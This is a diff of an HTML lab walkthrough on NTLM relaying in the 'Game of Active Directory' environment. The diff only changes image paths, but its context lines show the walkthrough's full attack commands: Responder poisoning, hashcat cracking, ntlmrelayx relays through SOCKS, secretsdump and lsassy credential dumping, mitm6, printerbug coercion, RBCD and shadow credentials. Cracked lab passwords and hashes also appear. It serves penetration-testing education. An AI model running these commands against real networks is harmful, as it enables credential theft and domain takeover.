@@ -218,7 +218,7 @@
 <p>-v : --verbose = Increase verbosity.</p>
 
 <p>The bot robb.stark attempts to establish an SMB connection to 'bravos' instead of 'braavos'. Since the DNS cannot resolve 'bravos' (with one 'a'), Windows defaults to sending a broadcast request to locate the computer. With Responder, we intercept this broadcast query, claiming that our server is the intended target, thereby capturing the connection from the user.</p>
-<img src="./images/screenshot_1.png" alt="">
+<img src="./game-of-active-directory/part-4-ntlm-relaying/images/screenshot_1.png" alt="">
 
 
 <pre><code>[SMB] NTLMv2-SSP Client   : 10.4.10.11
@@ -227,7 +227,7 @@
 
 
 <p>After a few more minutes (with the eddard bot running every 5 minutes and the robb bot every 3 minutes), we also received a connection from eddard.stark.</p>
-<img src="./images/screenshot_2.png" alt="">
+<img src="./game-of-active-directory/part-4-ntlm-relaying/images/screenshot_2.png" alt="">
 
 
 <pre><code>[SMB] NTLMv2-SSP Client   : 10.4.10.11
@@ -241,7 +241,7 @@
 <p>Upon successfully intercepting the broadcast resolution requests via Responder, we secured the NetNTLMv2 cryptographic challenges for both robb.stark and eddard.stark. These hashes represent the user's proof of knowledge of their password without transmitting the password itself, forcing us to transition these artifacts to our offline cracking infrastructure for recovery. We utilized Hashcat with mode 5600, targeting the hashes against the rockyou.txt wordlist to audit the password complexity policies of these specific users.</p>
 <p>NetNTLMv2</p>
 <p>hashcat -m 5600 -a 0 robb_NTLMv2_HASH /usr/share/wordlists/rockyou.txt.gz -O</p>
-<img src="./images/screenshot_3.png" alt="">
+<img src="./game-of-active-directory/part-4-ntlm-relaying/images/screenshot_3.png" alt="">
 
 
 <p>This process yielded a rapid and critical compromise of the robb.stark identity, revealing the plaintext credential sexywolfy. The significance of this finding cannot be overstated because our previous RID brute-force enumeration identified Robb Stark as a member of the North Domain Admins group. Consequently, cracking this single weak password has effectively granted us administrative control over the Winterfell Domain Controller, allowing us to log in via Evil-WinRM or SMB to dump the entire domain database if we choose.</p>
@@ -262,7 +262,7 @@
 <p>Before we launch a single poisoned packet, we must rigorously define the "kill list" for our relay operation. Blindly relaying credentials to every host on the subnet is operationally reckless and technically futile because the vast majority of Windows systems specifically Domain Controllers will reject our forwarded authentication attempts due to enforced SMB Signing. Our objective in this phase is to use NetExec to interrogate the network and mathematically determine which servers will accept a relayed, unsigned authentication session.</p>
 <p>The technical distinction we are hunting for is the difference between "Signing Enabled" and "Signing Required." This is a frequent point of confusion that separates junior testers from senior operators. When NetExec reports signing:True (often in green), it merely indicates that the server is capable of signing packets. It does not necessarily mean it mandates it. In a default Active Directory environment, Domain Controllers require signing (Secure), while member servers and workstations simply have it enabled (Vulnerable). If the server only "Enables" signing, our relay tool can negotiate a session protocol that simply declines to sign the packets, and the server will accept it.</p>
 <p>netexec smb 10.4.10.0/24 --gen-relay-list hosts</p>
-<img src="./images/screenshot_4.png" alt="">
+<img src="./game-of-active-directory/part-4-ntlm-relaying/images/screenshot_4.png" alt="">
 
 
 <p>In our scan of the 10.4.10.0/24 subnet, NetExec automatically handles this logic for us with the --gen-relay-list flag. Looking at our output, we see a crucial dichotomy. Kingslanding, Winterfell, and Meereen are Domain Controllers, their security policy strictly enforces signing, meaning any attempt to relay SMB traffic to them will result in a hard disconnect and a "Signature Verification Failed" event log. NetExec correctly filters these out. Conversely, we identify Castelblack and Braavos as our primary targets. Specifically, Braavos shows signing:False (in Red), indicating an extremely insecure configuration, likely unrelated to SMBv1 legacy support where the server essentially offers zero integrity protection on the wire.</p>
@@ -301,7 +301,7 @@ LDAP = On</code></pre>
 <p>impacket-ntlmrelayx -tf hosts.txt -smb2support</p>
 
 <p>Once both tools are active, we simply wait. The moment a victim machine (like a bot or a real user) triggers a broadcast request by mistyping a server name or failing a DNS lookup, Responder will direct them to us, and ntlmrelayx will immediately seize that connection to attack the targets in our list.</p>
-<img src="./images/screenshot_5.png" alt="">
+<img src="./game-of-active-directory/part-4-ntlm-relaying/images/screenshot_5.png" alt="">
 
 
 <p>Here we are seeing the difference between a successful relay that just grants a session and a successful relay that yields the Local Administrator crown jewels. The captured authentication stream comes from NORTH\EDDARD.STARK, originating from the Domain Controller (Winterfell). Since Eddard is a Domain Administrator, his credentials hold the highest possible privileges within the North domain, effectively turning our relay station into a weapon of mass destruction against any host that does not enforce SMB signing.</p>
@@ -312,7 +312,7 @@ LDAP = On</code></pre>
 
 <p>Above, we have a proof of concept (PoC) demonstrating the successful exploitation of this attack, where the user NORTH/eddard.stark logged into the machine at 10.4.10.22 and successfully dumped the SAM hashes.</p>
 <p>hashcat -m 1000 -a 0 hash ~/Documents/Tools/SecLists/rockyou.txt</p>
-<img src="./images/screenshot_6.png" alt="">
+<img src="./game-of-active-directory/part-4-ntlm-relaying/images/screenshot_6.png" alt="">
 
 
 
@@ -323,12 +323,12 @@ LDAP = On</code></pre>
 <p>Once we receive the notification that a connection has been relayed and a port typically 127.0.0.1:11000 or 11001 is successfully bound, we utilize a standard netcat client (nc) to connect to our own localhost on that specific port. This connection drops us immediately into an interactive SMB shell that mimics the functionality of smbclient, but runs entirely within the context of the relayed user (e.g., Robb Stark). From this shell, we can browse the remote file system, list directory contents, upload malicious payloads, or download sensitive files, all without ever knowing the user's password. This method offers significantly better OpSec for sensitive environments, as we can perform targeted searches for configuration files or specific data (like the GPP xml) without triggering the massive volume of Event ID 4663 logs associated with a full automated spider or hash dump. We are effectively holding the door open and walking through it manually to look around the specific room we choose.</p>
 <p>sudo responder -I eth0 -dw -vvv</p>
 <p>ntlmrelayx.py -tf hosts.txt -smb2support -i</p>
-<img src="./images/screenshot_7.png" alt="">
+<img src="./game-of-active-directory/part-4-ntlm-relaying/images/screenshot_7.png" alt="">
 
 
 <p>The output above confirms successful authentication on host 10.4.10.23 with the user robb.stark, and a port forwarding to port 11001 has been established. Now, to access our localhost, we simply use netcat on port 11001 to navigate through all folders and files by using shares to identify and use to use the shares we want to access.</p>
 <p>nc -nv 127.0.0.1 11001</p>
-<img src="./images/screenshot_8.png" alt="">
+<img src="./game-of-active-directory/part-4-ntlm-relaying/images/screenshot_8.png" alt="">
 
 
 
@@ -346,7 +346,7 @@ LDAP = On</code></pre>
 
 <p>Start responder to redirect queries to the relay server.</p>
 <p>responder -I eth0 -vvv</p>
-<img src="./images/screenshot_9.png" alt="">
+<img src="./game-of-active-directory/part-4-ntlm-relaying/images/screenshot_9.png" alt="">
 
 
 <p>This screenshot confirms that we have successfully transitioned our attack infrastructure into a SOCKS Proxy state, which is fundamentally different from the previous methods. </p>
@@ -388,7 +388,7 @@ socks4 127.0.0.1 1080</code></pre>
 
 <p>When we target the SAM Database, our primary objective is the extraction of the local user hashes, specifically the built-in Administrator (RID 500). This NTLM hash serves as a "Skeleton Key" because in many organizations, local administrator passwords are reused across server groups or workstations. Obtaining this single hash allows us to perform lateral movement using Pass-the-Hash against any other machine in the subnet that shares this credential deployment, breaking our dependency on the initial relay victim.</p>
 <p>proxychains impacket-secretsdump -no-pass NORTH/EDDARD.STARK@10.4.10.22</p>
-<img src="./images/screenshot_10.png" alt="">
+<img src="./game-of-active-directory/part-4-ntlm-relaying/images/screenshot_10.png" alt="">
 
 
 <pre><code>[*] Service RemoteRegistry is in stopped state
@@ -443,7 +443,7 @@ north.sevenkingdoms.local\sql_svc:YouWillNotKerboroast1ngMeeeeee</code></pre>
 
 <p>Lsassy allows us to dump LSASS remotely (very more convenient then doing a procdump, download of the LSASS dump file and doing pypykatz or mimikatz locally), it do all the painful actions like dump and read lsass content for you (it also dump only the usefull part of the lsass dump optimizing the time of transfer).</p>
 <p>proxychains lsassy --no-pass -d NORTH -u EDDARD.STARK 10.4.10.22</p>
-<img src="./images/screenshot_11.png" alt="">
+<img src="./game-of-active-directory/part-4-ntlm-relaying/images/screenshot_11.png" alt="">
 
 
 <p>We have successfully looted the memory of Castelblack and retrieved valid Kerberos tickets, stored as .kirbi files. These are not password hashes that need cracking; they are active, digital keys that we can use immediately.</p>
@@ -471,7 +471,7 @@ north.sevenkingdoms.local\sql_svc:YouWillNotKerboroast1ngMeeeeee</code></pre>
 <p>By extracting the private key of the domain controller, it's possible to decrypt these blobs and recover all the secrets stored in the Windows Credentials Manager across all workstations in the domain.</p>
 <p>https://github.com/login-securite/DonPAPI</p>
 <p>proxychains donpapi collect -d 'NORTH' -u 'EDDARD.STARK' -p '' --no-pass -t 10.4.10.22</p>
-<img src="./images/screenshot_12.png" alt="">
+<img src="./game-of-active-directory/part-4-ntlm-relaying/images/screenshot_12.png" alt="">
 
 
 <pre><code>[10.4.10.22] [$] [LSA] localuser:password
@@ -489,7 +489,7 @@ north.sevenkingdoms.local\sql_svc:YouWillNotKerboroast1ngMeeeeee</code></pre>
 <p>We now introduce NetExec into our SOCKS workflow as a streamlined alternative for forensic data extraction. While dedicated tools like DonPapi are excellent, NetExec’s built-in --dpapi module offers a highly integrated approach that can rapidly identify, decrypt, and parse sensitive blobs directly within our active engagement session. By routing NetExec through our proxychains tunnel, we can leverage the authenticated relay session to seamlessly interact with the target's protected storage without deploying additional scripts.</p>
 <p>Operational success in this specific vector requires strict adherence to the session handling logic of ntlmrelayx. As we have learned, the relay server maintains its session inventory based on exact string matches—specifically the Short Domain Name (e.g., NORTH). Therefore, when we execute NetExec, we must be syntactically precise: we target the FQDN to ensure correct SOCKS resolution, but we force the domain context using the -d flag to match the relay's key. This alignment allows NetExec to "hook" the administrative pipe, automatically retrieve the user's MasterKeys using the Local System or Admin privileges, and immediately attempt to decrypt cached browser credentials, wireless keys, and remote connection strings residing on the host.</p>
 <p>proxychains poetry run netexec smb CASTELBLACK.north.sevenkingdoms.local -u 'eddard.stark' -p '' -d 'NORTH' --dpapi</p>
-<img src="./images/screenshot_13.png" alt="">
+<img src="./game-of-active-directory/part-4-ntlm-relaying/images/screenshot_13.png" alt="">
 
 
 <p>Seeing "Got 6 decrypted masterkeys" followed by silence (no credential dumps) confirms that the technical execution of the attack was flawless, but the user profile itself effectively empty. We must differentiate between a Mechanism Failure (the tool broke) and an Intelligence Gap (the target had nothing to steal). This result falls strictly into the latter category.</p>
@@ -509,7 +509,7 @@ north.sevenkingdoms.local\sql_svc:YouWillNotKerboroast1ngMeeeeee</code></pre>
 <p>Once inside this interactive shell, we can perform commands such as dir, cd, and get to exfiltrate specific data like the web.config of an IIS server or a KeePass database found in a user's Documents folder. This manual interaction allows us to be significantly more surgical than automated scrapers, extracting high-value targets while minimizing the forensic noise generated by traversing millions of irrelevant system files.</p>
 <p>We execute the interactive session using the following syntax, ensuring we strictly target the IP address keyed in our SOCKS proxy to maintain the integrity of the relay injection:</p>
 <p>proxychains poetry run netexec smb CASTELBLACK.north.sevenkingdoms.local -u 'eddard.stark' -d 'NORTH' -p '' --shares</p>
-<img src="./images/screenshot_14.png" alt="">
+<img src="./game-of-active-directory/part-4-ntlm-relaying/images/screenshot_14.png" alt="">
 
 
 <p>The output from our NetExec command represents the definitive situational awareness sweep. By routing the request through the SOCKS tunnel, the tool successfully leveraged Eddard Stark’s administrative session to audit the entire share landscape of Castelblack (10.4.10.22). The strategic value here lies in the Permissions column. We see that the session possesses READ, WRITE access to ADMIN$, C$, Public and a custom share named all. This confirms we have full remote control of the file system. In an automated pipeline, seeing WRITE on C$ or ADMIN$ is the green light for remote code execution techniques like Psexec or SMBExec, because it means we can drop payloads directly into the system root. NetExec provided this intelligence in seconds, allowing us to validate our privilege level across all potential attack surfaces simultaneously.</p>
@@ -517,7 +517,7 @@ north.sevenkingdoms.local\sql_svc:YouWillNotKerboroast1ngMeeeeee</code></pre>
 
 <p>We deploy NetExec when we need immediate situational awareness regarding the access levels available to our relayed session. Rather than manually testing directories one by one, NetExec acts as a high-speed triage engine that interrogates the target to generate a comprehensive list of all visible shares. The strategic value of this tool lies in its ability to immediately validate permission flags, clearly distinguishing between standard READ access and the critical WRITE access required for lateral movement. By running this enumeration through our tunnel, we quickly identify high-value targets such as a writable web root or a deployment share allowing us to prioritize our subsequent manual exploitation efforts efficiently and avoid wasting time on locked or irrelevant system folders.</p>
 <p>proxychains smbclient.py -no-pass 'NORTH'/'EDDARD.STARK'@'10.4.10.22' -debug</p>
-<img src="./images/screenshot_15.png" alt="">
+<img src="./game-of-active-directory/part-4-ntlm-relaying/images/screenshot_15.png" alt="">
 
 
 <p>By establishing an interactive shell via smbclient.py, we have moved past simple verification and are now "walking the floor" of the compromised server. The screenshot confirms that we successfully mounted the C$ administrative share, a protected resource restricted only to local administrators. The successful ls command revealing the root directory structure (Windows, Users, Program Files) proves that our relay tunnel is stable enough to support directory browsing. This capability is critical for finding artifacts that automated tools miss, such as a backup configuration file sitting in the root of C$, or exploring the contents of a user's Desktop folder for sensitive documents. Unlike the NetExec sweep, which tells us that we can access files, smbclient is the instrument we use to actually steal them or to manually upload a C2 implant for a stealthier, non-service-based execution.</p>
@@ -530,7 +530,7 @@ north.sevenkingdoms.local\sql_svc:YouWillNotKerboroast1ngMeeeeee</code></pre>
 
 <p>We execute these attacks using proxychains to route our traffic into the administrative relay session we previously identified.</p>
 <p>proxychains smbexec.py 'NORTH/eddard.stark'@'10.4.10.22' -no-pass</p>
-<img src="./images/screenshot_16.png" alt="">
+<img src="./game-of-active-directory/part-4-ntlm-relaying/images/screenshot_16.png" alt="">
 
 
 <p>Alternatively, we can employ atexec.py as our secondary option. This tool leverages the Task Scheduler interface via RPC over SMB to achieve the same goal. Instead of creating a service, it registers a scheduled task to run our command immediately, piping the output to a temporary file for retrieval. We use atexec primarily when we encounter environments where Service Creation is strictly monitored or blocked, as Task Scheduler manipulation is often less audited. Both tools ensure our traffic stays within the boundaries of the established SOCKS tunnel.</p>
@@ -550,7 +550,7 @@ north.sevenkingdoms.local\sql_svc:YouWillNotKerboroast1ngMeeeeee</code></pre>
 <p>1. Wait or Coerce: As machines on the network reboot or renew leases, they will latch onto our rogue IPv6 server. Authentication traffic will begin flowing into our relay, which will forward it to the DC's directory service to dump database info.</p>
 <p>Warning on Impact: This attack is significantly more aggressive than LLMNR poisoning. Because we are taking over DNS resolution for the victim, we essentially become their gateway to the network. If we stop the tool abruptly or misconfigure the relay, the victim loses internet and intranet connectivity. In a real engagement, this causes immediate "Denial of Service" tickets to the Help Desk. In GOAD, it is the perfect way to force a DC compromise using standard user traffic.</p>
 <p>sudo mitm6 -i eth0 --debug</p>
-<img src="./images/screenshot_17.png" alt="">
+<img src="./game-of-active-directory/part-4-ntlm-relaying/images/screenshot_17.png" alt="">
 
 
 <p>After initializing our mitm6 it’s possible to see 4 important messages on our output.</p>
@@ -566,7 +566,7 @@ north.sevenkingdoms.local\sql_svc:YouWillNotKerboroast1ngMeeeeee</code></pre>
 <p>Our specific objective with this command is Resource-Based Constrained Delegation (RBCD), which will be a topic that we will discuss later on during GOAD - part 10 - Delegations . </p>
 <p>Instead of just dumping data, we are attempting to manipulate the Active Directory structure itself to create a permanent backdoor.</p>
 <p>ntlmrelayx.py -6 -wh 'wpadfakeserver.essos.local' -t 'ldaps://meereen.essos.local' --add-computer 'starkcomputer' --delegate-access</p>
-<img src="./images/screenshot_18.png" alt="">
+<img src="./game-of-active-directory/part-4-ntlm-relaying/images/screenshot_18.png" alt="">
 
 
 <p>Here is a breakdown of the specific arguments and the "Kill Chain" they automate:</p>
@@ -577,17 +577,17 @@ north.sevenkingdoms.local\sql_svc:YouWillNotKerboroast1ngMeeeeee</code></pre>
 <p>-delegate-access: This is the finishing move. Once our new computer account (starkcomputer$) is created, this flag modifies the victim object's attributes to "Trust" our new computer. This allows us to impersonate an Administrator on the victim machine later using the new computer account we just minted.</p>
 <p>Basically we are taking a standard authentication attempt and converting it into a persistent mechanism that allows us to impersonate domain admins against the target machine.</p>
 <p>In a real world infra, we would have to wait for our victim to reboot or reconnect to the network (VLAN) where we do have our mitm6 & ntlmrelayx running. Because we are dealing with a Lab environment, let’s simply connect to BRAAVOS via RDP and make some changes to our NIC (Network Interface Card) configuration.</p>
-<img src="./images/screenshot_19.png" alt="">
+<img src="./game-of-active-directory/part-4-ntlm-relaying/images/screenshot_19.png" alt="">
 
 
 <p>Notes: For this attack to work, we should make sure that we have set Obtain an IP address automatically, we do have set Obtain DNS server address automatically and last but not least, the Internet Protocol Version 6 is enabled as well (Which normally they are enabled by default). Once we do have this configuration done, we can simply open CMD.exe and issue the command ipconfig /renew or reboot the machine.</p>
 <p>Checking our target machine’s network configuration again after this renew or reboot, we will see that the DNS Server’s IP is now the IPv6 is the same IPv6 assigned to us when we ran mitm6 on our attacking machine. We have poisoned the DNS.</p>
-<img src="./images/screenshot_20.png" alt="">
+<img src="./game-of-active-directory/part-4-ntlm-relaying/images/screenshot_20.png" alt="">
 
 
 
 <p>Now, if we do have a look to ntlmrelayx again, we have successfully executed the Resource-Based Constrained Delegation attack, a pivotal moment that transitions our access from simple relaying to persistent architectural compromise. In the logs provided, we can observe that our poisoning effort captured the authentication of the machine account BRAAVOS$, likely following a reboot or network refresh. Rather than simply dumping information, ntlmrelayx leveraged this privileged session against the Domain Controller's LDAPS service to execute a complex two-stage exploitation chain that fundamentally alters the trust relationships within the domain.</p>
-<img src="./images/screenshot_21.png" alt="">
+<img src="./game-of-active-directory/part-4-ntlm-relaying/images/screenshot_21.png" alt="">
 
 
 
@@ -596,15 +596,15 @@ north.sevenkingdoms.local\sql_svc:YouWillNotKerboroast1ngMeeeeee</code></pre>
 <p>While modifying domain objects to create persistent backdoors (like in the RBCD attack) is powerful, sometimes our goal is pure, high-volume intelligence gathering without altering the directory state. We achieve this by configuring ntlmrelayx to act as a data siphon rather than an active modifier. By omitting flags like --add-computer or --delegate-access and simply specifying a loot directory (-l /tmp/loot), we instruct the relay server to perform a comprehensive dump of the target domain's metadata the moment a connection is established.</p>
 <p>This operation effectively mirrors the capabilities of BloodHound or extensive manual LDAP reconnaissance, but with a critical advantage: it requires zero credentials beforehand. Because we are relaying the session of a machine account (like BRAAVOS$) or a user, we inherit their "Read" permissions on the entire directory tree. When the relay handshake with the Domain Controller succeeds (seen in the log as Authenticating... SUCCEED), the tool automatically executes a recursive query against the Global Catalog and Domain Partitions.</p>
 <p>ntlmrelayx.py -6 -wh 'wpadfakeserver.essos.local' -t 'ldaps://meereen.essos.local' -l /tmp/loot</p>
-<img src="./images/screenshot_22.png" alt="">
+<img src="./game-of-active-directory/part-4-ntlm-relaying/images/screenshot_22.png" alt="">
 
 
 <p>The result, as shown in the screenshot, is a treasure trove of static HTML and grep-able text files dumped into our local directory. Specifically, domain_users_by_group.html provides a clickable roster of every user and their privileges, while domain_computers_by_os.html allows us to identify legacy operating systems (like Server 2008) that might be vulnerable to older exploits. This passive dump is often the preferred first step in a "Purple Team" or stealth-focused engagement, as reading the directory is a legitimate action that generates far fewer high-severity alerts than adding new computer accounts or modifying security descriptors. It essentially turns a single poisoned packet into a complete map of the Essos domain.</p>
-<img src="./images/screenshot_23.png" alt="">
+<img src="./game-of-active-directory/part-4-ntlm-relaying/images/screenshot_23.png" alt="">
 
 
 <p>We can simply now open domain_users.html for with any browser and we can see some GUI of the users inside essos.local domain.</p>
-<img src="./images/screenshot_24.png" alt="">
+<img src="./game-of-active-directory/part-4-ntlm-relaying/images/screenshot_24.png" alt="">
 
 
 
@@ -627,7 +627,7 @@ north.sevenkingdoms.local\sql_svc:YouWillNotKerboroast1ngMeeeeee</code></pre>
 
 <p>In a separate terminal, we use our authenticated user session to poke the target. We utilize the python tool Coercer (a powerful successor to individual scripts like printerbug.py or petitpotam.py) which attempts multiple known RPC coercion methods automatically. We target Castelblack, instructing it to connect back to our Kali IP address (the listener).</p>
 <p>python3 printerbug.py 'essos.local/khal.drago:horse'@'braavos.essos.local' 10.4.10.179</p>
-<img src="./images/screenshot_25.png" alt="">
+<img src="./game-of-active-directory/part-4-ntlm-relaying/images/screenshot_25.png" alt="">
 
 
 <p>When the printerbug.py command executes, Braavos processes the RPC request and immediately initiates an outgoing SMB connection to our Kali box. ntlmrelayx intercepts this incoming ESSOS/BRAAVOS$ machine account authentication. Utilizing the "Drop the Mic" vulnerability, the tool modifies the NTLM negotiation flags in transit to bypass signing requirements and successfully relays the session to the Essos Domain Controller (Meereen) via LDAPS.</p>
@@ -636,11 +636,11 @@ north.sevenkingdoms.local\sql_svc:YouWillNotKerboroast1ngMeeeeee</code></pre>
 <p>This completes the architectural compromise. We have not just stolen a credential, we have re-architected the trust logic of the Essos domain to grant us permanent administrative rights on the target server. We can now perform the final extraction by using the getST.py (Get Service Ticket) tool to forge a ticket as Administrator for Braavos, essentially walking through the front door we just unlocked.</p>
 <p>Now that the attack has succeeded, we can exploit the Braavos server with RBCD. Having successfully added a computer to the domain, we can now leverage this to request the Administrator Service Ticket.</p>
 <p>getST.py -spn HOST/BRAAVOS.ESSOS.LOCAL -impersonate Administrator -dc-ip 10.4.10.12 'ESSOS.LOCAL/mrstark3$:IZq5,#*}D4)HDq-'</p>
-<img src="./images/screenshot_26.png" alt="">
+<img src="./game-of-active-directory/part-4-ntlm-relaying/images/screenshot_26.png" alt="">
 
 
 <p>NOTE: If you get the error: Kerberos SessionError: KRB_AP_ERR_SKEW while trying to execute the getST.py as you can see the screenshot below. We can easily fix it by executing the script that follow along.</p>
-<img src="./images/screenshot_27.png" alt="">
+<img src="./game-of-active-directory/part-4-ntlm-relaying/images/screenshot_27.png" alt="">
 
 
 <pre><code>#!/bin/bash
@@ -689,7 +689,7 @@ echo "The KRB_AP_ERR_SKEW barrier is successfully removed for $TARGET."</code></
 <p>With the retrieval of the Administrator service ticket in the form of a .ccache file, we have effectively completed the execution phase of the coercion attack chain. Our immediate next move is to operationalize this ticket by exporting the KRB5CCNAME environment variable, which tells our attack tools to utilize this specific credential cache for authentication. Once loaded, we can target the Braavos server directly using tools like secretsdump.py or psexec.py, forcing the remote system to acknowledge us as the local administrator without ever having provided a password or hash. This step validates that our manipulation of the delegation attributes successfully translated into tangible system access.</p>
 <p>export KRB5CCNAME=Administrator.ccache</p>
 <p>secretsdump.py -k -no-pass 'ESSOS.LOCAL/administrator@braavos.essos.local'</p>
-<img src="./images/screenshot_28.png" alt="">
+<img src="./game-of-active-directory/part-4-ntlm-relaying/images/screenshot_28.png" alt="">
 
 
 <pre><code>Impacket v0.14.0.dev0+20260114.195536.1a876e02 - Copyright Fortra, LLC and its affiliated companies 
@@ -732,7 +732,7 @@ ESSOS.LOCAL/khal.drogo:$DCC2$10240#khal.drogo#f6e0610d7070ac77c69f566696f4e1d5: 
 
 <p>We initiate this operation by configuring our relay infrastructure to exploit the msDS-KeyCredentialLink attribute. Unlike our previous attacks that relied on extracting secrets, this technique relies on injection. We establish our ntlmrelayx listener targeting the LDAPS interface of the Meereen Domain Controller. We utilize LDAPS (port 636) specifically because Active Directory requires an encrypted channel to modify sensitive attributes like delegation or key credentials. The listener is armed with the --shadow-credentials flag, which instructs the tool to automatically generate a public-private key pair and attempt to write the public portion into the victim object's attributes upon a successful relay.</p>
 <p>ntlmrelayx.py -t ldaps://meereen.essos.local -smb2support --remove-mic --shadow-credentials</p>
-<img src="./images/screenshot_29.png" alt="">
+<img src="./game-of-active-directory/part-4-ntlm-relaying/images/screenshot_29.png" alt="">
 
 
 
@@ -740,10 +740,10 @@ ESSOS.LOCAL/khal.drogo:$DCC2$10240#khal.drogo#f6e0610d7070ac77c69f566696f4e1d5: 
 
 <p>To drive traffic into this trap, we utilize printerbug.py as a surgical trigger against the Braavos server. This script leverages the MS-RPRN Print Spooler interface to coerce the machine into authenticating back to our attack IP. Once the RPC command is sent, Braavos initiates a standard SMB connection to us. Our relay intercepts this authentication stream, authenticates to the Domain Controller as BRAAVOS$, and utilizes the "Write Property" permission (which we manually enabled for the SELF principal in the previous lab setup) to append a new Key Credential to its own object. The successful execution results in the relay server generating and saving a PFX certificate file locally on our attack machine, effectively handing us a digital smartcard for the victim server.</p>
 <p>python3 printerbug.py 'essos.local/khal.drago:horse'@'braavos.essos.local' 10.4.10.179</p>
-<img src="./images/screenshot_30.png" alt="">
+<img src="./game-of-active-directory/part-4-ntlm-relaying/images/screenshot_30.png" alt="">
 
 
-<img src="./images/screenshot_31.png" alt="">
+<img src="./game-of-active-directory/part-4-ntlm-relaying/images/screenshot_31.png" alt="">
 
 
 <h4>Step 3: The Result & Usage</h4>
@@ -751,7 +751,7 @@ ESSOS.LOCAL/khal.drogo:$DCC2$10240#khal.drogo#f6e0610d7070ac77c69f566696f4e1d5: 
 <p>With the forged PFX certificate securely in our possession, we transition from the exploitation phase to the authentication phase. This step is critical because we are moving from a proprietary attack mechanism to a legitimate feature of the Kerberos protocol known as Public Key Cryptography for Initial Authentication (PKINIT). We leverage the gettgtpkinit.py utility to interface with the Key Distribution Center (KDC) on Meereen. This tool performs a standard Kerberos AS-REQ, but instead of encrypting the timestamp with a password hash (which we do not have), it signs the request using the private key inside our looted PFX file.</p>
 <p>The Domain Controller validates the signature against the public key we injected into the msDS-KeyCredentialLink attribute of the BRAAVOS$ object. Finding a match, the KDC issues a Ticket Granting Ticket (TGT) valid for the machine account. The tool saves this ticket as a Credential Cache (ccache) file. This artifact is the operational equivalent of knowing the computer account's 120-character random password; it allows us to interact with any service in the forest that trusts this specific computer identity.</p>
 <p>python3 PKINITtools/gettgtpkinit.py -cert-pfx QLLw3a2R.pfx -pfx-pass xMzZAZ1diw77ppAqx4nZ essos.local/BRAAVOS$ QLLw3a2R.ccache</p>
-<img src="./images/screenshot_32.png" alt="">
+<img src="./game-of-active-directory/part-4-ntlm-relaying/images/screenshot_32.png" alt="">
 
 
 
@@ -759,7 +759,7 @@ ESSOS.LOCAL/khal.drogo:$DCC2$10240#khal.drogo#f6e0610d7070ac77c69f566696f4e1d5: 
 <p>We verify our access by targeting the victim host itself using NetExec. We invoke the tool with the -k (Use Kerberos) and --use-kcache (Use the environment ticket) flags against the Fully Qualified Domain Name of Braavos. The successful output shows us authenticating as ESSOS.LOCAL\BRAAVOS$. </p>
 <p>export KRB5CCNAME=QLLw3a2R.ccache</p>
 <p>poetry run netexec smb braavos.essos.local -k --use-kcache</p>
-<img src="./images/screenshot_33.png" alt="">
+<img src="./game-of-active-directory/part-4-ntlm-relaying/images/screenshot_33.png" alt="">
 
 
 <p>This confirms that we have achieved total compromise of the host by becoming the host itself. From this position, we have the privileges of the Local System account, allowing us to perform tasks such as dumping local secrets, scheduling administrative jobs, or leveraging the machine's trusted identity to attack other resources within the domain.</p>
